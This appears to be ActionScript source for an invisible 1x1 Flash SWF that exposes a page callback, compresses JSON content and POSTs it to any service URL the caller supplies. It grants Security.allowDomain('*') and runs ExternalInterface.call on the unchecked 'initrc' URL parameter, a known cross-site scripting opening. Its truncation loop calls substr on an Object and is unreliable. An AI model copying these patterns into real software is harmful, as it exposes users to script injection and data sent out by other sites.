package
{
import flash.display.Sprite;
import flash.events.HTTPStatusEvent;
import flash.external.ExternalInterface;
import flash.net.URLLoader;
import flash.net.URLLoaderDataFormat;
import flash.net.URLRequest;
import flash.net.URLRequestMethod;
import flash.system.Security;
import flash.utils.ByteArray;
import flash.utils.Endian;

[SWF(width=1, height=1, backgroundColor="0xFFFFFF", frameRate="10")]
public class HTTPCrawler extends Sprite
{
    private const MAX_SEND_SIZE:uint = 200 << 10;

    public function HTTPCrawler()
    {
        super();
        initialize();
        postInit();
    }

    public function i8crawlPage(service:String, content:Object):void
    {
        var bytes:ByteArray = new ByteArray();
        bytes.writeByte("A".charCodeAt(0));
        bytes.endian = Endian.LITTLE_ENDIAN;
        bytes.writeUTFBytes(JSON.stringify(content));
        bytes.writeByte("V".charCodeAt(0));
        bytes.compress();
        for (var i:int = 0, tryedTimes:int = 0; bytes.length > MAX_SEND_SIZE && ++tryedTimes < 10; ++i)
        {
            bytes.clear();
            bytes.writeByte("A".charCodeAt(0));
            bytes.writeUTFBytes(content.substr(0, content.length >> i));
            bytes.writeByte("V".charCodeAt(0));
            bytes.compress();
        }
        bytes.position = 0;
        sendContent(service, bytes);
    }

    protected function sendContent(service:String, data:ByteArray):void
    {
        try {
            var request:URLRequest = new URLRequest(service);
            request.data = data;
            request.method = URLRequestMethod.POST;
            var loader:URLLoader = new URLLoader();
            loader.dataFormat = URLLoaderDataFormat.TEXT;
            loader.addEventListener(HTTPStatusEvent.HTTP_STATUS, onResponse);
            loader.load(request);
        } catch (e:*) {}
    }

    protected function onResponse(event:HTTPStatusEvent):void
    {
    }

    private function initialize():void
    {
        Security.allowDomain("*");
        ExternalInterface.addCallback('i8crawlPage', i8crawlPage);
    }

    private function postInit():void
    {
        if ("initrc" in loaderInfo.parameters)
        {
            try
            {
                ExternalInterface.call(loaderInfo.parameters["initrc"]);
            }
            catch (e:*)
            {
            }
        }
    }
}

}
